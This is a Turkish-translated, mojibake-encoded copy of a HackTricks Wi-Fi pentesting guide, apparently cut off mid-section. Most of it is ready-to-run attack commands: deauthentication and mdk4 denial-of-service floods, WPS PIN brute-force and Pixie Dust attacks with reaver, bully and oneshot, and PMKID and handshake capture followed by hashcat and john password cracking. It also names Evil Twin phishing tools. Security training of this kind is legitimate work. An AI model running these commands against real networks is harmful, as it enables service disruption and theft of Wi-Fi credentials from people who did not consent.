# Pentesting Wifi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**BugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmak iÃ§in** [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katÄ±lÄ±n!

## Wifi temel komutlarÄ±
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## AraÃ§lar

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Docker ile airgeddon'u Ã§alÄ±ÅŸtÄ±r**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Evil Twin, KARMA ve Known Beacons saldÄ±rÄ±larÄ±nÄ± gerÃ§ekleÅŸtirebilir ve ardÄ±ndan aÄŸÄ±n gerÃ§ek ÅŸifresini elde etmek veya sosyal aÄŸ kimlik bilgilerini yakalamak iÃ§in bir phishing ÅŸablonu kullanabilir.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Bu araÃ§ **WPS/WEP/WPA-PSK** saldÄ±rÄ±larÄ±nÄ± otomatikleÅŸtirir. Otomatik olarak:

* ArayÃ¼zÃ¼ izleme moduna ayarlar
* OlasÄ± aÄŸlarÄ± tarar - Ve kurban(larÄ±) seÃ§menize izin verir
* EÄŸer WEP ise - WEP saldÄ±rÄ±larÄ±nÄ± baÅŸlatÄ±r
* EÄŸer WPA-PSK ise
* EÄŸer WPS ise: Pixie dust saldÄ±rÄ±sÄ± ve brute-force saldÄ±rÄ±sÄ± (brute-force saldÄ±rÄ±sÄ±nÄ±n uzun sÃ¼rebileceÄŸine dikkat edin). Null PIN veya veritabanÄ±/Ã¼retim PIN'lerini denemediÄŸini unutmayÄ±n.
* KÄ±rmak iÃ§in AP'den PMKID yakalamaya Ã§alÄ±ÅŸÄ±r
* Bir el sÄ±kÄ±ÅŸma yakalamak iÃ§in AP'nin istemcilerini deauthentik etmeye Ã§alÄ±ÅŸÄ±r
* PMKID veya El SÄ±kÄ±ÅŸma varsa, en iyi 5000 ÅŸifreyi kullanarak brute-force denemesi yapar.

## SaldÄ±rÄ± Ã–zeti

* **DoS**
* Deauthentication/disassociation -- Herkesi (veya belirli bir ESSID/MÃ¼ÅŸteri) baÄŸlantÄ±dan ayÄ±r
* Rastgele sahte AP'ler -- AÄŸlarÄ± gizle, olasÄ± tarayÄ±cÄ±larÄ± Ã§Ã¶kert
* AP'yi aÅŸÄ±rÄ± yÃ¼kle -- AP'yi Ã¶ldÃ¼rmeye Ã§alÄ±ÅŸ (genellikle Ã§ok faydalÄ± deÄŸildir)
* WIDS -- IDS ile oyna
* TKIP, EAPOL -- BazÄ± AP'lere DoS yapmak iÃ§in belirli saldÄ±rÄ±lar
* **KÄ±rma**
* **WEP** kÄ±rma (birÃ§ok araÃ§ ve yÃ¶ntem)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute-force
* \[DoS +] **WPA el sÄ±kÄ±ÅŸmasÄ±** yakalama + KÄ±rma
* **WPA-MGT**
* **KullanÄ±cÄ± adÄ± yakalama**
* **Bruteforce** Kimlik Bilgileri
* **Evil Twin** (DoS ile veya olmadan)
* **AÃ§Ä±k** Evil Twin \[+ DoS] -- Captive portal kimlik bilgilerini yakalamak ve/veya LAN saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in faydalÄ±dÄ±r
* **WPA-PSK** Evil Twin -- Åifreyi biliyorsanÄ±z aÄŸ saldÄ±rÄ±larÄ± iÃ§in faydalÄ±dÄ±r
* **WPA-MGT** -- Åirket kimlik bilgilerini yakalamak iÃ§in faydalÄ±dÄ±r
* **KARMA, MANA**, **Loud MANA**, **Bilinen iÅŸaret**
* **+ AÃ§Ä±k** -- Captive portal kimlik bilgilerini yakalamak ve/veya LAN saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in faydalÄ±dÄ±r
* **+ WPA** -- WPA el sÄ±kÄ±ÅŸmalarÄ±nÄ± yakalamak iÃ§in faydalÄ±dÄ±r

## DOS

### Deauthentication Paketleri

**AÃ§Ä±klama** [**buradan**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** saldÄ±rÄ±larÄ±, Wi-Fi hacking'de yaygÄ±n bir yÃ¶ntemdir ve "yÃ¶netim" Ã§erÃ§evelerini sahteleyerek **cihazlarÄ± bir aÄŸdan zorla ayÄ±rmayÄ±** iÃ§erir. Bu ÅŸifrelenmemiÅŸ paketler, istemcileri meÅŸru aÄŸdan geldiklerine inandÄ±rarak, saldÄ±rganlarÄ±n kÄ±rma amaÃ§larÄ± iÃ§in WPA el sÄ±kÄ±ÅŸmalarÄ±nÄ± toplamasÄ±na veya aÄŸ baÄŸlantÄ±larÄ±nÄ± sÃ¼rekli olarak kesintiye uÄŸratmasÄ±na olanak tanÄ±r. Bu basitlikteki taktik, yaygÄ±n olarak kullanÄ±lmakta ve aÄŸ gÃ¼venliÄŸi iÃ§in Ã¶nemli sonuÃ§lar doÄŸurmaktadÄ±r.

**Aireplay-ng kullanarak Deauthentication**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0, deauthentikasyonu ifade eder
* 1, gÃ¶nderilecek deauth sayÄ±sÄ±nÄ± belirtir (isterseniz birden fazla gÃ¶nderebilirsiniz); 0, sÃ¼rekli gÃ¶ndermek anlamÄ±na gelir
* \-a 00:14:6C:7E:40:80, eriÅŸim noktasÄ±nÄ±n MAC adresidir
* \-c 00:0F:B5:34:30:30, deauthentike edilecek istemcinin MAC adresidir; bu belirtilmezse, yayÄ±n deauthentikasyonu gÃ¶nderilir (her zaman Ã§alÄ±ÅŸmaz)
* ath0, arayÃ¼z adÄ±dÄ±r

### AyrÄ±lma Paketleri

**AyrÄ±lma paketleri**, deauthentikasyon paketlerine benzer ÅŸekilde, Wi-Fi aÄŸlarÄ±nda kullanÄ±lan bir yÃ¶netim Ã§erÃ§evesi tÃ¼rÃ¼dÃ¼r. Bu paketler, bir cihaz (Ã¶rneÄŸin, bir dizÃ¼stÃ¼ bilgisayar veya akÄ±llÄ± telefon) ile bir eriÅŸim noktasÄ± (AP) arasÄ±ndaki baÄŸlantÄ±yÄ± kesmek iÃ§in kullanÄ±lÄ±r. AyrÄ±lma ve deauthentikasyon arasÄ±ndaki temel fark, kullanÄ±m senaryolarÄ±ndadÄ±r. Bir AP, **aÄŸdan kÃ¶tÃ¼ niyetli cihazlarÄ± aÃ§Ä±kÃ§a kaldÄ±rmak iÃ§in deauthentikasyon paketleri yayarken, ayrÄ±lma paketleri genellikle AP kapatÄ±ldÄ±ÄŸÄ±nda, yeniden baÅŸlatÄ±ldÄ±ÄŸÄ±nda veya yer deÄŸiÅŸtirirken gÃ¶nderilir; bu da baÄŸlÄ± tÃ¼m dÃ¼ÄŸÃ¼mlerin baÄŸlantÄ±sÄ±nÄ±n kesilmesini gerektirir.**

**Bu saldÄ±rÄ± mdk4 (mod "d") ile gerÃ§ekleÅŸtirilebilir:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4 ile Daha Fazla DOS SaldÄ±rÄ±sÄ±**

**Burada** [**bulabilirsiniz**](https://en.kali.tools/?p=864)**.**

**SALDIRI MODU b: Beacon Flooding**

MÃ¼ÅŸterilerde sahte AP'leri gÃ¶stermek iÃ§in beacon Ã§erÃ§eveleri gÃ¶nderir. Bu bazen aÄŸ tarayÄ±cÄ±larÄ±nÄ± ve hatta sÃ¼rÃ¼cÃ¼leri Ã§Ã¶kertir!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Kimlik DoÄŸrulama Hizmet Reddi**

EriÅŸim alanÄ±ndaki tÃ¼m eriÅŸim noktalarÄ±na (AP) kimlik doÄŸrulama Ã§erÃ§eveleri gÃ¶ndermek, Ã¶zellikle birÃ§ok istemci sÃ¶z konusu olduÄŸunda bu AP'leri aÅŸÄ±rÄ± yÃ¼kleyebilir. Bu yoÄŸun trafik, sistem kararsÄ±zlÄ±ÄŸÄ±na yol aÃ§abilir ve bazÄ± AP'lerin donmasÄ±na veya hatta sÄ±fÄ±rlanmasÄ±na neden olabilir.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

EriÅŸim NoktalarÄ±nÄ± (AP) sorgulamak, bir SSID'nin dÃ¼zgÃ¼n bir ÅŸekilde ifÅŸa edilip edilmediÄŸini kontrol eder ve AP'nin menzilini doÄŸrular. Bu teknik, **gizli SSID'leri** bir kelime listesi ile veya kelime listesi olmadan bruteforcing ile birleÅŸtirildiÄŸinde, gizli aÄŸlarÄ± tanÄ±mlamaya ve eriÅŸmeye yardÄ±mcÄ± olur.

**ATTACK MODE m: Michael Countermeasures Exploitation**

FarklÄ± QoS kuyruklarÄ±na rastgele veya kopya paketler gÃ¶ndermek, **TKIP AP'lerinde** Michael KarÅŸÄ± Ã–nlemlerini tetikleyebilir ve bir dakikalÄ±k AP kapatÄ±lmasÄ±na yol aÃ§abilir. Bu yÃ¶ntem, etkili bir **DoS** (Hizmet Reddi) saldÄ±rÄ± taktiÄŸidir.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL BaÅŸlangÄ±Ã§ ve Logoff Paket Enjeksiyonu**

Bir AP'yi **EAPOL BaÅŸlangÄ±Ã§ Ã§erÃ§eveleri** ile doldurmak **sahte oturumlar** oluÅŸturur, AP'yi aÅŸÄ±rÄ± yÃ¼kler ve meÅŸru istemcileri engeller. Alternatif olarak, **sahte EAPOL Logoff mesajlarÄ±** enjekte etmek istemcileri zorla baÄŸlantÄ±dan ayÄ±rÄ±r, her iki yÃ¶ntem de aÄŸ hizmetini etkili bir ÅŸekilde kesintiye uÄŸratÄ±r.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s aÄŸlarÄ± iÃ§in saldÄ±rÄ±lar**

AÄŸlarda baÄŸlantÄ± yÃ¶netimi ve yÃ¶nlendirme Ã¼zerine Ã§eÅŸitli saldÄ±rÄ±lar.

**ATTACK MODE w: WIDS KarÄ±ÅŸÄ±klÄ±ÄŸÄ±**

MÃ¼ÅŸterileri birden fazla WDS dÃ¼ÄŸÃ¼mÃ¼ne veya sahte kÃ¶tÃ¼ niyetli AP'lere Ã§apraz baÄŸlamak, SaldÄ±rÄ± Tespit ve Ã–nleme Sistemlerini manipÃ¼le edebilir, karÄ±ÅŸÄ±klÄ±k yaratabilir ve potansiyel sistem kÃ¶tÃ¼ye kullanÄ±mÄ± oluÅŸturabilir.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Paket Fuzzer**

FarklÄ± paket kaynaklarÄ± ve paket manipÃ¼lasyonu iÃ§in kapsamlÄ± bir deÄŸiÅŸtirici seti sunan bir paket fuzzer.

### **Airggedon**

_**Airgeddon**_ Ã¶nceki yorumlarda Ã¶nerilen saldÄ±rÄ±larÄ±n Ã§oÄŸunu sunmaktadÄ±r:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi KorumalÄ± Kurulum), cihazlarÄ±n bir yÃ¶nlendiriciye baÄŸlanma sÃ¼recini basitleÅŸtirir, **WPA** veya **WPA2** KiÅŸisel ile ÅŸifrelenmiÅŸ aÄŸlar iÃ§in kurulum hÄ±zÄ±nÄ± ve kolaylÄ±ÄŸÄ±nÄ± artÄ±rÄ±r. Kolayca tehlikeye atÄ±labilen WEP gÃ¼venliÄŸi iÃ§in etkisizdir. WPS, iki yarÄ±da doÄŸrulanan 8 haneli bir PIN kullanÄ±r ve sÄ±nÄ±rlÄ± kombinasyon sayÄ±sÄ± (11,000 olasÄ±lÄ±k) nedeniyle brute-force saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±zdÄ±r.

### WPS Bruteforce

Bu eylemi gerÃ§ekleÅŸtirmek iÃ§in 2 ana araÃ§ vardÄ±r: Reaver ve Bully.

* **Reaver**, WPS'ye karÅŸÄ± saÄŸlam ve pratik bir saldÄ±rÄ± olarak tasarlanmÄ±ÅŸtÄ±r ve Ã§eÅŸitli eriÅŸim noktalarÄ± ve WPS uygulamalarÄ± Ã¼zerinde test edilmiÅŸtir.
* **Bully**, C dilinde yazÄ±lmÄ±ÅŸ **yeni bir uygulama** olan WPS brute force saldÄ±rÄ±sÄ±dÄ±r. Orijinal reaver koduna gÃ¶re birkaÃ§ avantajÄ± vardÄ±r: daha az baÄŸÄ±mlÄ±lÄ±k, geliÅŸtirilmiÅŸ bellek ve CPU performansÄ±, endianlÄ±k yÃ¶netiminde doÄŸru iÅŸlem ve daha saÄŸlam bir seÃ§enek seti.

SaldÄ±rÄ±, **WPS PIN'in zayÄ±flÄ±ÄŸÄ±nÄ±** istismar eder, Ã¶zellikle ilk dÃ¶rt hanenin ifÅŸasÄ± ve son hanenin bir kontrol toplamÄ± olarak rolÃ¼, brute-force saldÄ±rÄ±sÄ±nÄ± kolaylaÅŸtÄ±rÄ±r. Ancak, saldÄ±rganlarÄ±n MAC adreslerini **engelleme** gibi brute-force saldÄ±rÄ±larÄ±na karÅŸÄ± savunmalar, saldÄ±rÄ±ya devam etmek iÃ§in **MAC adresi dÃ¶ngÃ¼sÃ¼** gerektirir.

Bully veya Reaver gibi araÃ§larla WPS PIN elde edildikten sonra, saldÄ±rgan WPA/WPA2 PSK'sÄ±nÄ± Ã§Ä±karabilir ve **kalÄ±cÄ± aÄŸ eriÅŸimi** saÄŸlayabilir.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**AkÄ±llÄ± Kaba GÃ¼Ã§**

Bu rafine yaklaÅŸÄ±m, bilinen gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kullanarak WPS PIN'lerini hedef alÄ±r:

1. **Ã–nceden keÅŸfedilmiÅŸ PIN'ler**: Belirli Ã¼reticilere baÄŸlÄ±, uniform WPS PIN'leri kullandÄ±ÄŸÄ± bilinen PIN'lerin bir veritabanÄ±nÄ± kullanÄ±n. Bu veritabanÄ±, MAC adreslerinin ilk Ã¼Ã§ oktetini bu Ã¼reticilere ait olasÄ± PIN'lerle iliÅŸkilendirir.
2. **PIN Ãœretim AlgoritmalarÄ±**: AP'nin MAC adresine dayalÄ± olarak WPS PIN'lerini hesaplayan ComputePIN ve EasyBox gibi algoritmalarÄ± kullanÄ±n. Arcadyan algoritmasÄ± ayrÄ±ca bir cihaz kimliÄŸi gerektirir ve PIN Ã¼retim sÃ¼recine bir katman ekler.

### WPS Pixie Dust saldÄ±rÄ±sÄ±

**Dominique Bongard**, bazÄ± EriÅŸim NoktalarÄ± (AP'ler) ile ilgili gizli kodlarÄ±n oluÅŸturulmasÄ±nda bir hata keÅŸfetti; bu kodlara **nonce** denir (**E-S1** ve **E-S2**). Bu nonceler Ã§Ã¶zÃ¼lebilirse, AP'nin WPS PIN'ini kÄ±rmak kolaylaÅŸÄ±r. AP, meÅŸru olduÄŸunu ve sahte (rogue) bir AP olmadÄ±ÄŸÄ±nÄ± kanÄ±tlamak iÃ§in PIN'i Ã¶zel bir kod (hash) iÃ§inde aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. Bu nonceler, WPS PIN'ini saklayan "kasa"yÄ± aÃ§manÄ±n "anahtarlarÄ±" gibidir. Bununla ilgili daha fazla bilgi [burada](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)) bulunabilir.

BasitÃ§e ifade etmek gerekirse, sorun bazÄ± AP'lerin baÄŸlantÄ± sÃ¼recinde PIN'i ÅŸifrelemek iÃ§in yeterince rastgele anahtarlar kullanmamasÄ±dÄ±r. Bu, PIN'in aÄŸÄ±n dÄ±ÅŸÄ±ndan tahmin edilmesine (offline kaba gÃ¼Ã§ saldÄ±rÄ±sÄ±) karÅŸÄ± savunmasÄ±z hale getirir.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
EÄŸer cihazÄ± izleme moduna geÃ§irmek istemiyorsanÄ±z veya `reaver` ve `bully` ile ilgili bir sorun varsa, [OneShot-C](https://github.com/nikita-yfh/OneShot-C) denemeyi dÃ¼ÅŸÃ¼nebilirsiniz. Bu araÃ§, izleme moduna geÃ§meden Pixie Dust saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirebilir.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin saldÄ±rÄ±sÄ±

BazÄ± kÃ¶tÃ¼ tasarlanmÄ±ÅŸ sistemler, **Null PIN** (boÅŸ veya var olmayan PIN) ile eriÅŸim saÄŸlamaya bile izin verir, bu oldukÃ§a alÄ±ÅŸÄ±lmadÄ±k bir durumdur. **Reaver** aracÄ±, bu zafiyeti test etme yeteneÄŸine sahiptir, **Bully**'nin aksine.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

TÃ¼m Ã¶nerilen WPS saldÄ±rÄ±larÄ± _**airgeddon**_ kullanÄ±larak kolayca gerÃ§ekleÅŸtirilebilir.

![](<../../.gitbook/assets/image (219).png>)

* 5 ve 6 **Ã¶zel PIN'inizi** denemenize olanak tanÄ±r (eÄŸer varsa)
* 7 ve 8 **Pixie Dust saldÄ±rÄ±sÄ±nÄ±** gerÃ§ekleÅŸtirir
* 13 **NULL PIN'i** test etmenizi saÄŸlar
* 11 ve 12, **seÃ§ilen AP ile ilgili PIN'leri mevcut veritabanlarÄ±ndan toplar** ve **ÅŸu yÃ¶ntemlerle** olasÄ± **PIN'ler** oluÅŸturur: ComputePIN, EasyBox ve isteÄŸe baÄŸlÄ± olarak Arcadyan (tavsiye edilir, neden olmasÄ±n?)
* 9 ve 10 **her olasÄ± PIN'i** test eder

## **WEP**

ArtÄ±k Ã§ok kÄ±rÄ±k ve kullanÄ±lmÄ±yor. Sadece _**airgeddon**_'un bu tÃ¼r bir korumayÄ± hedeflemek iÃ§in "All-in-One" adlÄ± bir WEP seÃ§eneÄŸi sunduÄŸunu bilin. Daha fazla araÃ§ benzer seÃ§enekler sunar.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**Real-Time Hack News**\
HÄ±zla deÄŸiÅŸen hacking dÃ¼nyasÄ±nda gÃ¼ncel kalmak iÃ§in gerÃ§ek zamanlÄ± haberler ve bilgilerle takip edin

**Latest Announcements**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**BugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmak iÃ§in** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 'a katÄ±lÄ±n!

***

## WPA/WPA2 PSK

### PMKID

2018'de, **hashcat** [yeni bir saldÄ±rÄ± yÃ¶ntemini](https://hashcat.net/forum/thread-7717.html) aÃ§Ä±kladÄ±; bu yÃ¶ntem, yalnÄ±zca **bir tek paket** gerektirdiÄŸi ve hedef AP'ye baÄŸlÄ± herhangi bir istemci gerektirmediÄŸi iÃ§in benzersizdirâ€”sadece saldÄ±rgan ile AP arasÄ±nda etkileÅŸim gerektirir.

BirÃ§ok modern yÃ¶nlendirici, iliÅŸkilendirme sÄ±rasÄ±nda **ilk EAPOL** Ã§erÃ§evesine `Robust Security Network` olarak bilinen **isteÄŸe baÄŸlÄ± bir alan** ekler. Bu, `PMKID`'yi iÃ§erir.

Orijinal gÃ¶nderide aÃ§Ä±klandÄ±ÄŸÄ± gibi, **PMKID** bilinen veriler kullanÄ±larak oluÅŸturulur:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Verilen "PMK AdÄ±" sabit olduÄŸundan, AP'nin ve istasyonun BSSID'sini bildiÄŸimizde, `PMK` tam bir 4-yol el sÄ±kÄ±ÅŸmasÄ±ndan gelenle aynÄ± olduÄŸundan, **hashcat** bu bilgileri kullanarak PSK'yÄ± kÄ±rabilir ve ÅŸifreyi geri alabilir!

Bu bilgileri **toplamak** ve ÅŸifreyi yerel olarak **bruteforce** etmek iÃ§in ÅŸunlarÄ± yapabilirsiniz:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**Yakalanan PMKID'ler** **konsolda** gÃ¶sterilecek ve ayrÄ±ca **/tmp/attack.pcap** iÃ§inde **kaydedilecektir**.\
Åimdi, yakalamayÄ± **hashcat/john** formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rÃ¼n ve kÄ±rÄ±n:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
LÃ¼tfen doÄŸru bir hash formatÄ±nÄ±n **4 parÃ§a** iÃ§erdiÄŸini unutmayÄ±n, Ã¶rneÄŸin: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` EÄŸer sizin **sadece** **3 parÃ§a** iÃ§eriyorsa, o zaman bu **geÃ§ersizdir** (PMKID yakalama geÃ§erli deÄŸildi).

`hcxdumptool` **aynÄ± zamanda el sÄ±kÄ±ÅŸmalarÄ± da yakalar** (ÅŸu ÅŸekilde bir ÅŸey gÃ¶rÃ¼necektir: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). **El sÄ±kÄ±ÅŸmalarÄ±nÄ±** `cap2hccapx` kullanarak **hashcat**/**john** formatÄ±na **dÃ¶nÃ¼ÅŸtÃ¼rebilirsiniz**.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Bu aracÄ± kullanarak yakalanan bazÄ± el sÄ±kÄ±ÅŸmalarÄ±nÄ±n doÄŸru ÅŸifre bilinse bile kÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± fark ettim. MÃ¼mkÃ¼nse el sÄ±kÄ±ÅŸmalarÄ± geleneksel yÃ¶ntemle de yakalamayÄ± veya bu aracÄ± kullanarak birkaÃ§ tane yakalamayÄ± Ã¶neririm._

### El SÄ±kÄ±ÅŸmasÄ± Yakalama

**WPA/WPA2** aÄŸlarÄ±na yÃ¶nelik bir saldÄ±rÄ±, bir **el sÄ±kÄ±ÅŸmasÄ±** yakalanarak ve ÅŸifreyi **Ã§Ã¶zmeye** Ã§alÄ±ÅŸarak gerÃ§ekleÅŸtirilebilir. Bu sÃ¼reÃ§, belirli bir aÄŸÄ±n ve belirli bir **kanalda** **BSSID**'nin iletiÅŸimini izlemeyi iÃ§erir. Ä°ÅŸte basit bir kÄ±lavuz:

1. Hedef aÄŸÄ±n **BSSID**'sini, **kanalÄ±nÄ±** ve bir **baÄŸlÄ± istemciyi** belirleyin.
2. Belirtilen kanal ve BSSID Ã¼zerinde aÄŸ trafiÄŸini izlemek iÃ§in `airodump-ng` kullanÄ±n, bir el sÄ±kÄ±ÅŸmasÄ± yakalamayÄ± umarak. Komut ÅŸÃ¶yle gÃ¶rÃ¼necek:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Bir el sÄ±kÄ±ÅŸmasÄ±nÄ± yakalama ÅŸansÄ±nÄ± artÄ±rmak iÃ§in, istemciyi aÄŸdan geÃ§ici olarak ayÄ±rarak yeniden kimlik doÄŸrulama yapmaya zorlayÄ±n. Bu, istemciye dekimlik doÄŸrulama paketleri gÃ¶nderen `aireplay-ng` komutu kullanÄ±larak yapÄ±labilir:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Not edin ki, istemci deauthentikasyon edildiÄŸinde farklÄ± bir AP'ye veya diÄŸer durumlarda farklÄ± bir aÄŸa baÄŸlanmaya Ã§alÄ±ÅŸabilir._

`airodump-ng` iÃ§inde bazÄ± el sÄ±kÄ±ÅŸma bilgileri gÃ¶rÃ¼ndÃ¼ÄŸÃ¼nde, bu el sÄ±kÄ±ÅŸmanÄ±n yakalandÄ±ÄŸÄ± anlamÄ±na gelir ve dinlemeyi durdurabilirsiniz:

![](<../../.gitbook/assets/image (172) (1).png>)

El sÄ±kÄ±ÅŸmasÄ± yakalandÄ±ktan sonra, bunu `aircrack-ng` ile **Ã§Ã¶zebilirsiniz**:
```
